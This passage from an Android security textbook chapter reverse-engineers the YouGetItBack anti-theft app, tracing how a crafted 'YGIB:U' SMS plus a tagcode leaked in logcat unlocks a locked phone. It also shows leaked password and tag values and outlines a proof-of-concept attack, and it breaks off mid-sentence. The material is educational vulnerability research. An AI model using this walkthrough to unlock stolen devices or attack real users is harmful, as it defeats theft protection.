p13.getString(1.82104762765e+38);\nv7 = p13.getString(1.82104783048e+38);\nv1 = p13.getString(1.8210480333e+38);\nv2 = p13.getString(1.82104823612e+38);\nv6 = p13.getString(1.82104864177e+38);\nv8 = p13.getString(1.82104843895e+38);\nthis.getAction(p12);\nif ((this.equals(v5) == 0) && ((this.equals(v4) == 0) &&\n((this.equals(v3) == 0) &&\n((this.equals(v0) == 0) && ((this.equals(v7) == 0) &&\n((this.equals(v6) == 0) && ((this.equals(v2) == 0) &&\n((this.equals(v8) == 0) && (this.equals(v1) == 0))))))))) {\nv10 = 0;\n} else {\nv10 = 1;\n}\nreturn v10;\n}\nYou see many calls to getString which, acting on the app’s current Context,\nretrieves the textual value for the given resource ID from the application’s string\ntable, such as those found in values/strings.xml. Notice, however, that the\nresource IDs passed to getString appear a bit odd. This is an artifact of some\ndecompilers’ type propagation issues, which you’ll deal with momentarily. The\npreviously described method is retrieving those strings from the strings table,\ncomparing them to the string in p12. The method returns 1 if p12 is matched, and\n0 if it isn’t. Back in onReceive, the result of this then determines if isPinLock is\ncalled, or if processContent is called. Take a look at isPinLock:\nIn [173]: d.CLASS_Lcom_yougetitback_androidapplication_SmsIntentReceiver.\nMETHOD_isPinLock.source()\nprivate boolean isPinLock(String p6, android.content.Context p7)\n{\nv2 = 0;\nv0 = p7.getSharedPreferences(\"SuperheroPrefsFile\", 0).getString\n(\"pin\", \"\");\nif ((v0.compareTo(\"\") != 0) && (p6.compareTo(v0) == 0)) {\nv2 = 1;\n}\nreturn v2;\n}\nc04.indd 01:15:7:PM 02/24/2014 Page 103\n104 Chapter 4 ■ Reviewing Application Security\nA-ha! The Shared Preferences fi le rears its head again. This small method calls\ngetString to get the value of the pin entry in SuperheroPrefsFile, and then\ncompares that with p6, and returns whether the comparison was true or false.\nIf the comparison was true, onReceive calls triggerAppLaunch. Decompiling\nthat method may bring you closer to understanding this whole fl ow:\nprivate void triggerAppLaunch(android.content.Context p9,\nandroid.telephony.SmsMessage p10)\n{\nthis.currentContext = p9;\nv4 = p9.getSharedPreferences(\"SuperheroPrefsFile\", 0);\nif (v4.getBoolean(\"Activated\", 0) != 0) {\nv1 = v4.edit();\nv1.putBoolean(\"lockState\", 1);\nv1.putBoolean(\"smspinlock\", 1);\nv1.commit();\nthis.foregroundUI(p9);\nv0 = p10.getOriginatingAddress();\nv2 = new android.content.Intent(\"com.yougetitback.\nandroidapplication.FOREGROUND\");\nv2.setClass(p9, com.yougetitback.androidapplication.\nFindLocationService);\nv2.putExtra(\"LockSmsOriginator\", v0);\np9.startService(v2);\nthis.startSiren(p9);\nv3 = new android.content.Intent(\"com.yougetitback.\nandroidapplicationn.FOREGROUND\");\nv3.setClass(this.currentContext, com.yougetitback.\nandroidapplication.LockAcknowledgeService);\nthis.currentContext.startService(v3);\n}\nHere, edits are made to SuperheroPrefsFile, setting some Boolean values to\nkeys indicating if the screen is locked, and if it was done so via SMS. Ultimately,\nnew Intents are created to start the application’s FindLocationService and\nLockAcknowledgeService services, both of which you saw earlier when listing\nservices. You can forego analyzing these services, as you can make some edu-\ncated guesses about their purposes. You still have the issue of understanding\nthe call to processContent back in onReceive:\nIn [613]: f = d.CLASS_Lcom_yougetitback_androidapplication_\nSmsIntentReceiver.METHOD_processContent.source()\nprivate void processContent(android.content.Context p16, String p17)\n{\nv6 = p16.getString(1.82104701918e+38);\nv1 = p16.getString(1.821047222e+38);\nv5 = p16.getString(1.82104742483e+38);\nv4 = p16.getString(1.82104762765e+38);\nv8 = p16.getString(1.82104783048e+38);\n...\nc04.indd 01:15:7:PM 02/24/2014 Page 104\nChapter 4 ■ Reviewing Application Security 105\nv11 = this.split(p17);\nv10 = v11.elementAt(0);\nif (p16.getSharedPreferences(\"SuperheroPrefsFile\",\n0).getBoolean(\"Activated\", 0) == 0) {\nif (v10.equals(v5) != 0) {\nthis.processActivationMsg(p16, v11);\n}\n} else {\nif ((v10.equals(v6) == 0) && ((v10.equals(v5) == 0) &&\n((v10.equals(v4) == 0) && ((v10.equals(v8) == 0) &&\n((v10.equals(v7) == 0) && ((v10.equals(v3) == 0) &&\n(v10.equals(v1) == 0))))))) {\nv10.equals(v2);\n}\nif (v10.equals(v6) == 0) {\nif (v10.equals(v9) == 0) {\nif (v10.equals(v5) == 0) {\nif (v10.equals(v4) == 0) {\nif (v10.equals(v1) == 0) {\nif (v10.equals(v8) == 0) {\nif (v10.equals(v7) == 0) {\nif (v10.equals(v3) == 0) {\nif (v10.equals(v2) != 0) {\nthis.processDeactivateMsg(p16,\nv11);\n}\n} else {\nthis.processFindMsg(p16, v11);\n}\n} else {\nthis.processResyncMsg(p16, v11);\n}\n} else {\nthis.processUnLockMsg(p16, v11);\n}\n...\nYou see similar calls to getString as you did in isValidMessage, along with\na series of if statements which further test the content of the SMS body to\ndetermine what method(s) to call thereafter. Of particular interest is fi nding\nwhat’s required to reach processUnLockMsg, which presumably unlocks the\ndevice. Before that, however, there’s some split method that’s called on p17,\nthe message body string:\nIn [1017]: d.CLASS_Lcom_yougetitback_androidapplication_\nSmsIntentReceiver.METHOD_split.source()\njava.util.Vector split(String p6)\n{\nv3 = new java.util.Vector();\nv2 = 0;\ndo {\nv1 = p6.indexOf(\" \", v2);\nc04.indd 01:15:7:PM 02/24/2014 Page 105\n106 Chapter 4 ■ Reviewing Application Security\nif (v1 < 0) {\nv0 = p6.substring(v2);\n} else {\nv0 = p6.substring(v2, v1);\n}\nv3.addElement(v0);\nv2 = (v1 + 1);\n} while(v1 != -1);\nreturn v3;\n}\nThis fairly simple method takes the message and chops it up into a Vector\n(similar to an array), and returns that. Back in processContent, weeding through\nthe nest of if statements, it looks like whatever’s in v8 is important. There’s still\nthe trouble of the resource IDs, however. Try disassembling it to see if you have\nbetter luck:\nIn [920]: d.CLASS_Lcom_yougetitback_androidapplication_\nSmsIntentReceiver.METHOD_processContent.show()\n...\n************************************************************************\n...\n12 (00000036) const v13, 2131296282\n13 (0000003c) move-object/from16 v0, v16\n14 (00000040) invoke-virtual v0, v13,\nLandroid/content/Context;->getString(I)Ljava/lang/String;\n15 (00000046) move-result-object v4\n16 (00000048) const v13, 2131296283\n17 (0000004e) move-object/from16 v0, v16\n18 (00000052) invoke-virtual v0, v13,\nLandroid/content/Context;->getString(I)Ljava/lang/String;\n19 (00000058) move-result-object v8\n...\nYou have numeric resource IDs now. The integer 2131296283 corresponds to\nsomething going into your register of interest, v8. Of course, you still need to\nknow what the actual textual value is for those resource IDs. To fi nd these values,\nemploy a bit more Python within androlyze by analyzing the APK’s resources:\naobj = a.get_android_resources()\nresid = 2131296283\npkg = aobj.packages.keys()[0]\nreskey = aobj.get_id(pkg,resid)[1]\naobj.get_string(pkg,reskey)\nThe Python code fi rst creates an ARSCParser object, aobj, representing all the\nsupporting resources for the APK, like strings, UI layouts, and so on. Next, resid\nholds the numeric resource ID you’re interested in. Then, it fetches a list with the\npackage name/identifi er using aobj.packages.keys, storing it in pkg. The textual\nresource key is then stored in reskey by calling aobj.get_id, passing in pkg and\nresid. Finally, the string value of reskey is resolved using aobj.get_string.\nc04.indd 01:15:7:PM 02/24/2014 Page 106\nChapter 4 ■ Reviewing Application Security 107\nUltimately, this snippet outputs the true string that processContent resolved—\nYGIB:U. For brevity’s sake, do this in one line as shown here:\nIn [25]: aobj.get_string(aobj.packages.keys()[0],aobj.get_id(aobj.\npackages.keys()[0],2131296283)[1])\nOut[25]: [u'YGIB_UNLOCK', u'YGIB:U']\nAt this juncture, we know that the SMS message will need to contain “YGIB:U”\nto potentially reach processUnLockMsg. Look at that method to see if there’s\nanything else you need:\nIn [1015]: d.CLASS_Lcom_yougetitback_androidapplication_\nSmsIntentReceiver.METHOD_processUnLockMsg.source()\nprivate void processUnLockMsg(android.content.Context p16,\njava.util.Vector p17)\n{\n...\nv9 = p16.getSharedPreferences(\"SuperheroPrefsFile\", 0);\nif (p17.size() >= 2) {\nv1 = p17.elementAt(1);\nif (v9.getString(\"tagcode\", \"\") == 0) {\nandroid.util.Log.v(\"SWIPEWIPE\",\n\"recieved unlock message\");\ncom.yougetitback.androidapplication.wipe.WipeController.\nstopWipeService(p16);\nv7 = new android.content.Intent(\"com.yougetitback.\nandroidapplication.BACKGROUND\");\nv7.setClass(p16, com.yougetitback.androidapplication.\nForegroundService);\np16.stopService(v7);\nv10 = new android.content.Intent(\"com.yougetitback.\nandroidapplication.BACKGROUND\");\nv10.setClass(p16, com.yougetitback.androidapplication.\nSirenService);\np16.stopService(v10);\nv9.edit();\nv6 = v9.edit();\nv6.putBoolean(\"lockState\", 0);\nv6.putString(\"lockid\", \"\");\nv6.commit();\nv5 = new android.content.Intent(\"com.yougetitback.\nandroidapplication.FOREGROUND\");\nv5.setClass(p16, com.yougetitback.androidapplication.\nUnlockAcknowledgeService);\np16.startService(v5);\n}\n}\nreturn;\n}\nc04.indd 01:15:7:PM 02/24/2014 Page 107\n108 Chapter 4 ■ Reviewing Application Security\nThis time you see that a key called tagcode is pulled from the SuperheroPrefsFile\nfi le, and then a series of services are stopped (and another started), which you\ncan assume unlocks the phone. This doesn’t seem right, as it would imply that\nso long as this key existed in the Shared Preferences fi le, it would evaluate\nto true—this is likely a decompiler error, so let’s check the disassembly with\npretty_show:\nIn [1025]: d.CLASS_Lcom_yougetitback_androidapplication_\nSmsIntentReceiver.METHOD_processUnLockMsg.pretty_show()\n...\n12 (00000036) const-string v13, 'SuperheroPrefsFile'\n13 (0000003a) const/4 v14, 0\n14 (0000003c) move-object/from16 v0, v16\n15 (00000040) invoke-virtual v0, v13, v14,\nLandroid/content/Context;->getSharedPreferences\n(Ljava/lang/String; I)Landroid/content/SharedPreferences;\n16 (00000046) move-result-object v9\n17 (00000048) const-string v1, ''\n18 (0000004c) const-string v8, ''\n19 (00000050) invoke-virtual/rangev17, Ljava/util/Vector;->\nsize()I\n20 (00000056) move-result v13\n21 (00000058) const/4 v14, 2\n22 (0000005a) if-lt v13, v14, 122\n[ processUnLockMsg-BB@0x5e processUnLockMsg-BB@0x14e ]\nprocessUnLockMsg-BB@0x5e :\n23 (0000005e) const/4 v13, 1\n24 (00000060) move-object/from16 v0, v17\n25 (00000064) invoke-virtual v0, v13,\nLjava/util/Vector;->elementAt(I)Ljava/lang/Object;\n26 (0000006a) move-result-object v1\n27 (0000006c) check-cast v1, Ljava/lang/String;\n28 (00000070) const-string v13, 'tagcode'\n29 (00000074) const-string v14, ''\n30 (00000078) invoke-interface v9, v13, v14,\nLandroid/content/SharedPreferences;->getString(\nLjava/lang/String; Ljava/lang/String;)\nLjava/lang/String;\n31 (0000007e) move-result-object v13\n32 (00000080) invoke-virtual v15, v1,\nLcom/yougetitback/androidapplication/\nSmsIntentReceiver;->EvaluateToken(\nLjava/lang/String;)Ljava/lang/String;\n33 (00000086) move-result-object v14\n34 (00000088) invoke-virtual v13, v14, Ljava/lang/String;-\n>compareTo(Ljava/lang/String;)I\n35 (0000008e) move-result v13\n36 (00000090) if-nez v13, 95 [ processUnLockMsg-BB@\n0x94 processUnLockMsg-BB@0x14e ]\nc04.indd 01:15:7:PM 02/24/2014 Page 108\nChapter 4 ■ Reviewing Application Security 109\nprocessUnLockMsg-BB@0x94 :\n37 (00000094) const-string v13, 'SWIPEWIPE'\n38 (00000098) const-string v14, 'recieved unlock message'\n39 (0000009c) invoke-static v13, v14, Landroid/util/Log;-\n>v(Ljava/lang/String; Ljava/lang/String;)I\n40 (000000a2) invoke-static/range v16,\nLcom/yougetitback/androidapplication/wipe/WipeController;\n->stopWipeService(Landroid/content/Context;)V\n[ processUnLockMsg-BB@0xa8 ]\n...\nThat clears it up—the value of the second element of the vector passed in is\npassed to EvaluateToken, and then the return value is compared to the value of\nthe tagcode key in the Shared Preferences fi le. If these two values match, then\nthe method continues as you previously saw. With that, you should realize that\nyour SMS message will need to effectively be something like YGIB:U followed\nby a space and the tagcode value. On a rooted device, retrieving this tag code\nwould be fairly easy, as you could just read the SuperheroPrefsFile directly\noff the fi le system. However, try taking some dynamic approaches and see if\nyou come up with anything else.\nDynamic Analysis\nDynamic analysis entails executing the application, typically in an instrumented\nor monitored manner, to garner more concrete information on its behavior. This\noften entails tasks like ascertaining artifacts the application leaves on the fi le\nsystem, observing network traffi c, monitoring process behavior...all things that\noccur during execution. Dynamic analysis is great for verifying assumptions\nor testing hypotheses.\nThe fi rst few things to address from a dynamic standpoint are getting a handle\non how a user would interact with the application. What is the workfl ow? What\nmenus, screens, and settings panes exist? Much of this can be discovered via\nstatic analysis—for instance, activities are easily identifi able. However, getting\ninto the details of their functionality can be time consuming. It’s often easier\nto just interact directly with the running application.\nIf you fi re up logcat while launching the app, you see some familiar activity\nnames as the ActivityManager spins the app up:\nI/ActivityManager( 245): START {act=android.intent.action.MAIN\ncat=[android.intent.category.LAUNCHER] flg=0x10200000\ncmp=com.yougetitback.androidapplication.virgin.mobile/\ncom.yougetitback.androidapplication.ActivateSplashScreen u=0} from pid 449\nI/ActivityManager( 245): Start proc\ncom.yougetitback.androidapplication.virgin.mobile for activity\ncom.yougetitback.androidapplication.virgin.mobile/\ncom.yougetitback.androidapplication.ActivateSplashScreen:\npid=2252 uid=10080 gids={1006, 3003, 1015, 1028}\nc04.indd 01:15:7:PM 02/24/2014 Page 109\n110 Chapter 4 ■ Reviewing Application Security\nFirst, you see the main activity (ActivateSplashScreen), as observed via\nAndroguard’s get_main_activity, and you see the main screen in Figure 4-5.\nFigure 4-5: Splash screen/main activity\nMoving through the app a bit more, you see prompts for a PIN and a secu-\nrity question as shown in Figure 4-6. After supplying this info, you see some\nnotable output in logcat.\nD/YGIB Test( 2252): Context from—\n>com.yougetitback.androidapplication.virgin.mobile\nI/RequestConfigurationService( 2252): RequestConfigurationService\ncreated!!!\nD/REQUESTCONFIGURATIONSERVICE( 2252): onStartCommand\nI/ActivationAcknowledgeService( 2252): RequestConfigurationService\ncreated!!!\nI/RequestConfigurationService( 2252): RequestConfigurationService\nstopped!!!\nI/PingService( 2252): PingService created!!!\nD/PINGSERVICE( 2252): onStartCommand\nI/ActivationAcknowledgeService( 2252): RequestConfigurationService\nstopped!!!\nI/PingService( 2252): RequestEtagService stopped!!!\nD/C2DMReceiver( 2252): Action is com.google.android.c2dm.intent.\nREGISTRATION\nI/intent telling something( 2252): == null ===null === Intent {\nact=com.google.android.c2dm.intent.REGISTRATION flg=0x10\npkg=com.yougetitback.androidapplication.virgin.mobile\nc04.indd 01:15:7:PM 02/24/2014 Page 110\nChapter 4 ■ Reviewing Application Security 111\ncmp=com.yougetitback.androidapp\nlication.virgin.mobile/\ncom.yougetitback.androidapplication.C2DMReceiver (has extras) }\nI/ActivityManager( 245): START\n{cmp=com.yougetitback.androidapplication.virgin.mobile/\ncom.yougetitback.androidapplication.ModifyPinScreen u=0} from pid 2252\n...\nFigure 4-6: PIN input and security questions screen\nSure enough, there are calls being logged to start and stop some of the services\nyou observed earlier, along with familiar activity names. Further down in the\nlog, however, you see an interesting information leak:\nD/update ( 2252): serverUrl-->https://virgin.yougetitback.com/\nD/update ( 2252): settingsUrl-->vaultUpdateSettings?\nD/update ( 2252): password-->3f679195148a1960f66913d09e76fca8dd31dc96\nD/update ( 2252): tagCode-->137223048617183\nD/update ( 2252): encodedXmlData—\n>%3c%3fxml%20version%3d'1.0'%20encoding%3d'UTF-\n8'%3f%3e%3cConfig%3e%3cSettings%3e%3cPin%3e1234%3c\n%2fPin%3e%3c%2fSettings%3e%3c%2fConfig%3e\n...\nD/YGIB Test( 2252): con.getResponseCode()-->200\nD/YGIB Test( 2252): urlString—\n>https://virgin.yougetitback.com/vaultUpdateSettings?pword=\n3f679195148a1960f66913d09e76fca8dd31dc96&tagid=137223048617183&type=S\nc04.indd 01:15:7:PM 02/24/2014 Page 111\n112 Chapter 4 ■ Reviewing Application Security\nD/YGIB Test( 2512): content-->%3c%3fxml%20version%3d'1.0'%20encoding%3d'\nUTF-8'%3f%3e%3cConfig%3e%3cSettings%3e%3cPin%3e1234%3c%2fPin\n%3e%3c%2fSettings%3e%3c%2fConfig%3e\nEven within the first few steps of this application’s workflow, it\nalready leaks session and confi guration data, including what could be the\ntagcode you were eyeing during static analysis. Diddling with and then saving\nconfi guration settings in the application also yields similarly verbose output\nin the log buffer:\nD/update ( 2252): serverUrl-->https://virgin.yougetitback.com/\nD/update ( 2252): settingsUrl-->vaultUpdateSettings?\nD/update ( 2252): password-->3f679195148a1960f66913d09e76fca8dd31dc96\nD/update ( 2252): tagCode-->137223048617183\nD/update ( 2252): encodedXmlData—\n>%3c%3fxml%20version%3d'1.0'%20encoding%3d'UTF-\n8'%3f%3e%3cConfig%3e%3cSettings%3e%3cServerNo%3e+447781482187%3c%2fServerNo%3e%\n3cServerURL%3ehttps:%2f%2fvirgin.yougetitback.com%2f%3c%2fServerURL%3e%3cBackup\nURL%3eContactsSave%3f%3c%2fBackupURL%3e%3cMessageURL%3ecallMainETagUSA%3f%3c%2f\nMessageURL%3e%3cFindURL%3eFind%3f%3c%2fFindURL%3e%3cExtBackupURL%3eextContactsS\nave%3f%3c%2fExtBackupURL%3e%3cRestoreURL%3erestorecontacts%3f%3c%2fRestoreURL%3\ne%3cCallCentre%3e+442033222955%3c%2fCallCentre%3e%3cCountryCode%3eGB%3c%2fCount\nryCode%3e%3cPin%3e1234%3c%2fPin%3e%3cURLPassword%3e3f679195148a1960f66913d09e76\nfca8dd31dc96%3c%2fURLPassword%3e%3cRoamingLock%3eoff%3c%2fRoamingLock%3e%3cSimL\nock%3eon%3c%2fSimLock%3e%3cOfflineLock%3eoff%3c%2fOfflineLock%3e%3cAutolock%20I\nnterval%3d%220%22%3eoff%3c%2fAutolock%3e%3cCallPatternLock%20OutsideCalls%3d%22\n6%22%20Numcalls%3d%226%22%3eon%3c%2fCallPatternLock%3e%3cCountryLock%3eoff%3c%2\nfCountryLock%3e%3c%2fSettings%3e%3cCountryPrefix%3e%3cPrefix%3e+44%3c%2fPrefix%\n3e%3c%2fCountryPrefix%3e%3cIntPrefix%3e%3cInternationalPrefix%3e00%3c%2fInterna\ntionalPrefix%3e%3c%2fIntPrefix%3e%3c%2fConfig%3e\nAs mentioned previously, this information would be accessible by an appli-\ncation with the READ_LOGS permission (prior to Android 4.1). Although this\nparticular leak may be suffi cient for achieving the goal of crafting the special\nSMS, you should get a bit more insight into just how this app runs. For that you\nuse a debugger called AndBug.\nAndBug connects to Java Debug Wire Protocol (JDWP) endpoints, which the\nAndroid Debugging Bridge (ADB) exposes for app processes either marked\nexplicitly with android:debuggable=true in their manifest, or for all app pro-\ncesses if the ro.debuggable property is set to 1 (typically set to 0 on production\ndevices). Aside from checking the manifest, running adb jdwp show debuggable\nPIDs. Assuming the target application is debuggable, you see output as follows:\n$ adb jdwp\n2252\nUsing grep to search for that PID maps accordingly to our target process (also\nseen in the previously shown logs):\n$ adb shell ps | grep 2252\nu0_a79 2252 88 289584 36284 ffffffff 00000000 S\ncom.yougetitback.androidapplication.virgin.mobile\nc04.indd 01:15:7:PM 02/24/2014 Page 112\nChapter 4 ■ Reviewing Application Security 113\nAfter you have this info, you can attach AndBug to the target device and\nprocess and get an interactive shell. Use the shell command and specify the\ntarget PID:\n$ andbug shell -p 2252\n## AndBug (C) 2011 Scott W. Dunlop <swdunlop@gmail.com>\n>>\nUsing the classes command, along with a partial class name, you can see\nwhat classes exist in the com.yougetitback namespace. Then using the methods\ncommand, discover the methods in a given class:\n>> classes com.yougetitback\n## Loaded Classes\n-- com.yougetitback.androidapplication.\nPinDisplayScreen$XMLParserHandler\n-- com.yougetitback.androidapplication.settings.main.Entrance$1\n...\n-- com.yougetitback.androidapplication.\nPinDisplayScreen$PinDisplayScreenBroadcast\n-- com.yougetitback.androidapplication.SmsIntentReceiver\n-- com.yougetitback.androidapplication.C2DMReceiver\n-- com.yougetitback.androidapplication.settings.setting.Setting\n...\n>> methods com.yougetitback.androidapplication.SmsIntentReceiver\n## Methods Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n-- com.yougetitback.androidapplication.SmsIntentReceiver.<init>()V\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nforegroundUI(Landroid/content/Context;)V\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\ngetAction(Ljava/lang/String;)Ljava/lang/String;\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\ngetMessagesFromIntent(Landroid/content/Intent;)[Landroid/telephony/\nSmsMessage;\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nisPinLock(Ljava/lang/String;Landroid/content/Context;)Z\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nisValidMessage(Ljava/lang/String;Landroid/content/Context;)Z\n...\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nprocessUnLockMsg(Landroid/content/Context;Ljava/util/Vector;)V\nIn the preceding code you see the class you were statically analyzing and\nreversing earlier: SmsIntentReceiver, along with the methods of interest. You\ncan now trace methods and their arguments and data. Start by tracing the\nSmsIntentReceiver class, using the class-trace command in AndBug, and\nthen sending the device a test SMS message with the text Test message:\n>> class-trace com.yougetitback.androidapplication.SmsIntentReceiver\n## Setting Hooks\n-- Hooked com.yougetitback.androidapplication.SmsIntentReceiver\n...\nc04.indd 01:15:7:PM 02/24/2014 Page 113\n114 Chapter 4 ■ Reviewing Application Security\ncom.yougetitback.androidapplication.SmsIntentReceiver\n>> ## trace thread <1> main (running suspended)\n-- com.yougetitback.androidapplication.SmsIntentReceiver.<init>()V:0\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830009571568>\n...\n## trace thread <1> main (running suspended)\n-- com.yougetitback.androidapplication.SmsIntentReceiver.onReceive(\nLandroid/content/Context;Landroid/content/Intent;)V:0\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830009571568>\n-- intent=Landroid/content/Intent; <830009581024>\n...\n## trace thread <1> main (running suspended)\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\ngetMessagesFromIntent(Landroid/content/Intent;)\n[Landroid/telephony/SmsMessage;:0\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830009571568>\n-- intent=Landroid/content/Intent; <830009581024>\n...\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nisValidMessage(Ljava/lang/String;Landroid/content/Context;)Z:0\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830009571568>\n-- msg=Test message\n-- context=Landroid/app/ReceiverRestrictedContext; <830007895400>\n...\nAs soon as the SMS message arrives, passed up from the Telephony subsystem,\nyour hook fi res, and you begin tracing from the initial onReceive method and\nbeyond. You see the Intent message that was passed to onReceive, as well as the\nsubsequent, familiar messages called thereafter. There’s also the msg variable in\nisValidMessage, containing our SMS text. As an aside, looking back the logcat\noutput, you also see the message body being logged:\nI/MessageListener:( 2252): Test message\nA bit further down in the class-trace, you see a call to isValidMessage, includ-\ning a Context object being passed in as an argument—and a set of fi elds in that\nobject which, in this case, map to resources and strings pulled from the strings\ntable (which you resolved manually earlier). Among them is the YGIB:U value you\nsaw earlier, and a corresponding key YGIBUNLOCK. Recalling your static analysis\nof this method, the SMS message body is being checked for these values, calling\nisPinLock if they’re not present, as shown here:\n## trace thread <1> main (running suspended)\n-- com.yougetitback.androidapplication.SmsIntentReceiver.getAction(\nLjava/lang/String;)Ljava/lang/String;:0\nc04.indd 01:15:7:PM 02/24/2014 Page 114\nChapter 4 ■ Reviewing Application Security 115\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830007979232>\n-- message=Foobarbaz\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nisValidMessage(Ljava/lang/String;Landroid/content/Context;)Z:63\n-- YGIBDEACTIVATE=YGIB:D\n-- YGIBFIND=YGIB:F\n-- context=Landroid/app/ReceiverRestrictedContext; <830007987072>\n-- YGIBUNLOCK=YGIB:U\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830007979232>\n-- YGIBBACKUP=YGIB:B\n-- YGIBRESYNC=YGIB:RS\n-- YGIBLOCK=YGIB:L\n-- YGIBWIPE=YGIB:W\n-- YGIBRESTORE=YGIB:E\n-- msg=Foobarbaz\n-- YGIBREGFROM=YGIB:T\n...\n## trace thread <1> main (running suspended)\n-- com.yougetitback.androidapplication.SmsIntentReceiver.isPinLock(\nLjava/lang/String;Landroid/content/Context;)Z:0\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830007979232>\n-- msg=Foobarbaz\n-- context=Landroid/app/ReceiverRestrictedContext; <830007987072>\n...\nIn this case isPinLock then evaluates the message, but the SMS message\ncontains neither the PIN nor one of those strings (like YGIB:U). The app does\nnothing with this SMS and instead passes it along to the next registered Broadcast\nReceiver in the chain. If you send an SMS message with the YGIB:U value, you’ll\nlikely see a different behavior:\n## trace thread <1> main (running suspended)\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nprocessContent(Landroid/content/Context;Ljava/lang/String;)V:0\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830008303000>\n-- m=YGIB:U\n-- context=Landroid/app/ReceiverRestrictedContext; <830007987072>\n...\n## trace thread <1> main (running suspended)\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nprocessUnLockMsg(Landroid/content/Context;Ljava/util/Vector;)V:0\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830008303000>\n-- smsTokens=Ljava/util/Vector; <830008239000>\n-- context=Landroid/app/ReceiverRestrictedContext; <830007987072>\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nc04.indd 01:15:7:PM 02/24/2014 Page 115\n116 Chapter 4 ■ Reviewing Application Security\nprocessContent(Landroid/content/Context;Ljava/lang/String;)V:232\n-- YGIBDEACTIVATE=YGIB:D\n-- YGIBFIND=YGIB:F\n-- context=Landroid/app/ReceiverRestrictedContext; <830007987072>\n-- YGIBUNLOCK=YGIB:U\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830008303000>\n-- settings=Landroid/app/ContextImpl$SharedPreferencesImpl;\n<830007888144>\n-- m=YGIB:U\n-- YGIBBACKUP=YGIB:B\n-- YGIBRESYNC=YGIB:RS\n-- YGIBLOCK=YGIB:L\n-- messageTokens=Ljava/util/Vector; <830008239000>\n-- YGIBWIPE=YGIB:W\n-- YGIBRESTORE=YGIB:E\n-- command=YGIB:U\n-- YGIBREGFROM=YGIB:T\nThis time, you ended up hitting both the processContent method and subse-\nquently the processUnLockMsg method, as you wanted. You can set a breakpoint\non the processUnLockMsg method, giving an opportunity to inspect it in a bit\nmore detail. You do this using AndBug’s break command, and pass the class\nand method name as arguments:\n>> break com.yougetitback.androidapplication.SmsIntentReceiver\nprocessUnLockMsg\n## Setting Hooks\n-- Hooked <536870913> com.yougetitback.androidapplication.\nSmsIntentReceiver.processUnLockMsg(Landroid/content/Context;\nLjava/util/Vector;)V:0 <class 'andbug.vm.Location'>\n>> ## Breakpoint hit in thread <1> main (running suspended), process\nsuspended.\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nprocessUnLockMsg(Landroid/content/Context;Ljava/util/Vector;)V:0\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nprocessContent(Landroid/content/Context;Ljava/lang/String;)V:232\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nonReceive(Landroid/content/Context;Landroid/content/Intent;)V:60\n--\n...\nYou know from the earlier analysis that getString will be called to retrieve\nsome value from the Shared Preferences fi le, so add a class-trace on the\nandroid.content.SharedPreferences class. Then resume the process with\nthe resume command:\n>> ct android.content.SharedPreferences\n## Setting Hooks\n-- Hooked android.content.SharedPreferences\n>> resume\nc04.indd 01:15:7:PM 02/24/2014 Page 116\nChapter 4 ■ Reviewing Application Security 117\nNOTE Running a method-trace or setting a breakpoint directly on certain methods\ncan result in blocking and process death, hence why you’re just tracing the entire\nclass. Additionally, the resume command may need to be run twice.\nAfter the process is resumed, the output will be fairly verbose (as before).\nWading once again through the call stack, you’ll eventually come up on the\ngetString method:\n## Process Resumed\n>> ## trace thread <1> main (running suspended)\n...\n## trace thread <1> main (running suspended)\n-- android.app.SharedPreferencesImpl.getString(Ljava/lang/String;\nLjava/lang/String;)Ljava/lang/String;:0\n-- this=Landroid/app/SharedPreferencesImpl; <830042611544>\n-- defValue=\n-- key=tagcode\n-- com.yougetitback.androidapplication.SmsIntentReceiver.\nprocessUnLockMsg(Landroid/content/Context;Ljava/util/Vector;)V:60\n-- smsTokens=Ljava/util/Vector; <830042967248>\n-- settings=Landroid/app/SharedPreferencesImpl; <830042611544>\n-- this=Lcom/yougetitback/androidapplication/SmsIntentReceiver;\n<830042981888>\n-- TYPELOCK=L\n-- YGIBTAG=TAG:\n-- TAG=AAAA\n-- YGIBTYPE=TYPE:\n-- context=Landroid/app/ReceiverRestrictedContext; <830042704872>\n-- setting=\n...\nAnd there it is, the Shared Preferences key you were looking for: tagcode,\nfurther confi rming what you identifi ed statically. This also happens to corre-\nspond to part of a log message that was leaked earlier, wherein tagCode was\nfollowed by a numeric string. Armed with this information, you know that our\nSMS message in fact needs to contain YGIB:U followed by a space and a tagcode\nvalue, or in this case, YGIB:U 137223048617183.\nAttack\nAlthough you could simply send your specially crafted SMS message to the\ntarget device, you’d still be out of luck in simply knowing the tagcode value if\nit happened to be different for some other, perhaps arbitrary, device (which is\npractically guaranteed). To this end, you’d want to leverage the leaked value\nin the log, which you could get in your proof-of-concept app by requesting the\nREAD_LOGS permission.\nc04.indd 01:15:7:PM 02/24/2014 Page 117\n118 Chapter 4 ■ Reviewing Application Security\nAfter this value is known, a simple SMS message to the target device, following\nthe format YGIB:U 137223048617183 would trigger the app’s unlock component.\nAlternatively, you could go a step further and forge the SMS_RECEIVED broadcast\nfrom your proof-of-concept app. As sending an implicit 